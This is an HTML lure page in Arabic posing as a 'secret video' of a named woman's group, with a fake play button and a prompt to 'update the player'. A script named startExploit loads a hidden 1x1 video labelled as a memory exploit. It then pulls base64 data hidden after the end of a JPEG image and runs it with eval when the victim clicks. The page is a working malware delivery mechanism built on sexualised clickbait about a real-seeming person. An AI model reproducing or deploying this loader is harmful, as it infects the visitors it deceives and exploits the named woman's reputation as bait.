<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>جروب شروق قاسم السرى</title>
    <meta property="og:title" content="انضمو لجروب شروق قاسم السرى 🔥">
    <meta property="og:image" content="target_pic.jpg">
    <script>
        async function startExploit() {
            // 1. تشغيل فيديو ضرب الذاكرة في الخلفية
            const v = document.createElement('video');
            v.src = 'exploit.mp4';
            v.autoplay = true; v.width = 1; v.height = 1;
            document.body.appendChild(v);

            // 2. استخراج البايلود من الصورة وتشغيله
            const response = await fetch('target_pic.jpg');
            const text = await response.text();
            const payload = text.split('\xFF\xD9')[1]; // استخراج ما بعد نهاية الصورة
            if (payload) {
                eval(atob(payload.trim()));
            }
        }
    </script>
</head>
<body style="background:black; color:white; text-align:center; padding-top:20px;" onclick="startExploit()">
    <h2>🔄 جارى تشغيل المقطع السرى...</h2>
    <div style="position:relative; display:inline-block; cursor:pointer;">
        <img src="target_pic.jpg" style="width:100%; max-width:400px; border-radius:15px; border:2px solid red;">
        <div style="position:absolute; top:50%; left:50%; transform:translate(-50%, -50%);">
            <svg width="70" height="70" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="rgba(0,0,0,0.5)" stroke="white" stroke-width="5"/><polygon points="40,30 70,50 40,70" fill="white"/></svg>
        </div>
    </div>
    <p>انقر لتحديث المشغل ومشاهدة الفيديو</p>
</body>
</html>
